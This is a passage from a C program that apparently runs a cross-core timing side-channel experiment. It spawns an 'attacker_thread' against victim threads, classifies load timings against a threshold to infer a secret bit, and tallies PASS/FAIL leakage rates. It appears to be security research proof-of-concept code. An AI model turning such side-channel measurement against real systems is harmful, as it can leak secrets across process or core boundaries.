                            sameBA++;
                        }
                        if(timeB > 150 && timeA > 150) {
                            goneBA++;
                        }
                        if(timeA > 150 && timeB < 150) {
                            dualBA++;
                        }
                        k++;
                    }
                }
                mBA_ex[x] = (float)workedBA/100;
                mBA_du[x] = (float)dualBA/100;

                char pass[] = "PASS";
                char fail[] = "FAIL";
                char * result;
                if(workedBA > dualBA) {result = pass; runpass[x]++;}
                else {result = fail; runfail[x]++;}

                if(qq==0)printf("[+][4][%0.2d] Multi-Core Secret 1 Victim:     A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/%0.2d] vs dual[%0.2d/%0.2d] + %s\n", x, dualBA, workedBA, goneBA, sameBA, workedBA, workedBA+dualBA+goneBA+sameBA, dualBA, workedBA+dualBA+goneBA+sameBA, result);

                if((qq%4 == 0) && (x == 39)) {
                    for(int zz = 0; zz < 40; zz++) {
                        printf("PASS[%0.2d] = %d     ", zz, runpass[zz]);
                        printf("FAIL[%0.2d] = %d\n", zz, runfail[zz]);
                    }
                }
            }



            if(0) {
                printf("%f", mAB_ex[0]);
                for(int j = 1; j < dump_size; j++) {
                    printf(",%f", mAB_ex[j]);
                }
                printf("\n");
                printf("%f", mAB_du[0]);
                for(int j = 1; j < dump_size; j++) {
                    printf(",%f", mAB_du[j]);
                }
                printf("\n");
                printf("%f", mBA_ex[0]);
                for(int j = 1; j < dump_size; j++) {
                    printf(",%f", mBA_ex[j]);
                }
                printf("\n");
                printf("%f", mBA_du[0]);
                for(int j = 1; j < dump_size; j++) {
                    printf(",%f", mBA_du[j]);
                }
                printf("\n");
            }
        }
    }

    printf("\n");
    for(int zz = 0; zz < INNER_ITER; zz++) {
        printf("PASS[%0.2d] = %0.2d     ", zz, runpass[zz]);
        printf("FAIL[%0.2d] = %0.2d\n", zz, runfail[zz]);
    }


/*
	for(int x = 0; x < 2; x++) {  
	workedAB = 0;
	workedBA = 0;
	sameAB = 0;
	sameBA = 0;
	goneAB = 0;
	goneBA = 0;
	dualAB = 0;
	dualBA = 0;
	printf(",%d", x);
	for(int k = 0; k < 100; ) {
		flag = 2;
		pthread_t a1;
		pthread_create(&a1, NULL, attacker_thread, NULL);
		//printf("[+] Started AB Victim Thread\n");	
    int loadB_time = contention0_victim_threadAB();
    //printf(",%d", loadB_time);
		if(1){
			if(timeA > 150 && timeB < 150) {
				workedAB++;
			}
			if(timeA < 150 && timeB < 150) {
				sameAB++;
			}
			if(timeA > 150 && timeB > 150) {
				goneAB++;
			}
			if(timeA < 150 && timeB > 150) {
				dualAB++;
			}
      k++;
		}
		//for(int q = 0; q < 1000000; q++) {}
	}
	printf(",%d", workedAB);
	mAB_ex[x] = (float)workedAB/100;
	mAB_du[x] = (float)dualAB/100;
	}

	printf("\n\n[+][4] Multi-Core No Contention Victim:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/%0.2d] vs dual[%0.2d/%0.2d]\n\n", workedAB, dualAB, goneAB, sameAB, workedAB, workedAB+dualAB+sameAB+goneAB, dualAB, workedAB+dualAB+sameAB+goneAB);

  printf("Multi-Core LoadB Times:");
  fflush(stdout);

	for(int x = 0; x < 2; x++) {  
	workedAB = 0;
	workedBA = 0;
	sameAB = 0;
	sameBA = 0;
	goneAB = 0;
	goneBA = 0;
	dualAB = 0;
	dualBA = 0;
	printf(",%d", x);  
	for(int k = 0; k < 100;) {
		flag = 2;
		pthread_t a1;
		pthread_create(&a1, NULL, attacker_thread, NULL);
		//printf("[+] Started BA Victim Thread\n");	
    int loadB_time = contention1_victim_threadBA();
    //printf(",%d", loadB_time);
		if(1){
			if(timeB > 150 && timeA < 150) {
				workedBA++;
			}
			if(timeA < 150 && timeB < 150) {
				sameBA++;
			}
			if(timeB > 150 && timeA > 150) {
				goneBA++;
			}
			if(timeA > 150 && timeB < 150) {
				dualBA++;
			}
	      k++;
		}
		//for(int q = 0; q < 1000000; q++) {}

	}

	printf(",%d", workedBA);
	mBA_ex[x] = (float)workedBA/100;
	mBA_du[x] = (float)dualBA/100;
	}

	printf("\n\n[+][4] Multi-Core Contention Victim:     A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/%0.2d] vs dual[%0.2d/%0.2d]\n\n", dualBA, workedBA, goneBA, sameBA, workedBA, workedBA+dualBA+goneBA+sameBA, dualBA, workedBA+dualBA+goneBA+sameBA);

*/
	mask = 0x80;
	secret = 0x8A;
	//printf("Starting Victim Thread\n");
	//victim_thread();
	//while(1) {};
	return 0;
}